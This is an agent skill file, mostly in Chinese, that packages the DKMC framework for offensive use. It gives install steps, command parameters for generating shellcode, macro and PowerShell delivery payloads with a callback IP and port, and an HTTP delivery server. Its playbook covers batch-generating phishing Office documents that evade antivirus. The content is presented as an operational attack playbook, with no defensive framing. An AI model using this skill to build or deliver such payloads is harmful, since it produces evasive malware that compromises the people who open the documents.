---
name: dkmc-macro-gen
description: "DKMC: phishing document batch generation. Signals: malware development, evasion development, macro delivery generation, HTTP service delivery."
zh-signals: "DKMC: 钓鱼文档批量生成。信号:恶意软件开发,免杀开发,生成宏投递,起 HTTP 服务投递。"
---

# DKMC

- 攻击大类:C45 免杀与载荷投递
- 上游仓库:https://github.com/Mr-Un1k0d3r/DKMC
- 上游 License:GPL-3.0(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)

## 安装

```bash
git clone https://github.com/Mr-Un1k0d3r/DKMC && cd DKMC
```

## 参数速查

| 参数 / 命令 | 说明 |
| --- | --- |
| `python dkmc.py` | 交互生成 shellcode 投递包 |
| `generate -i 10.0.0.5 -p 4444 -t macro` | 生成宏投递 |
| `generate ... -t powershell` | 生成 PowerShell 投递 |
| `deploy` | 起 HTTP 服务投递 |

## 攻击场景 Playbook

### 钓鱼文档批量生成

```bash
python dkmc.py
# payload→编码→嵌入 Office 文档,各杀软查杀率实时可选
```

## 注意事项

Don't Kill My Cat,恶意宏/脚本生成框架,交互式多步构建绕过 AV。
